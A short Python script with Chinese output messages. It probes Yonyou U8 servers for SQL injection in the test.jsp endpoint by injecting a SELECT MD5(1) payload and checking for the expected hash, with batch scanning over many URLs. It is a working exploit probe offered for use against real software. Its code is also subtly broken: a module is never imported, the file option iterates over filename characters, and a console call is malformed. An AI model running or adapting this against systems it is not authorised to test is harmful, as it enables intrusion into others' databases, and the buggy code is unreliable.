import requests
import re
import sys
from urllib.parse import quote
import argparse
from rich.console import Console

console = Console()

def main(target_url):
    console.print('[*]正在检测用友U8的test.jsp是否存在SQL注入漏洞',style='bold blue')
    url = target_url + '/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360'
    }
    try:
        response = requests.get(url=url, headers=headers, timeout=5)
        if response.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in response.text:
            console.print('[SUCCESS]该系统可能存在SQL注入漏洞，具体URL为: {}\n'.format(url),style='bold green')
            return url
        else:
            console.print('[WARNING]该系统的用友U8不存在SQL注入\n', style='bold yellow')
    except:
        console.print('[WARNING]该系统无法连接\n', style='bold yellow')

if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url')
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            console.print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.console.print('\nCTRL+C 退出', style='reverse bold red')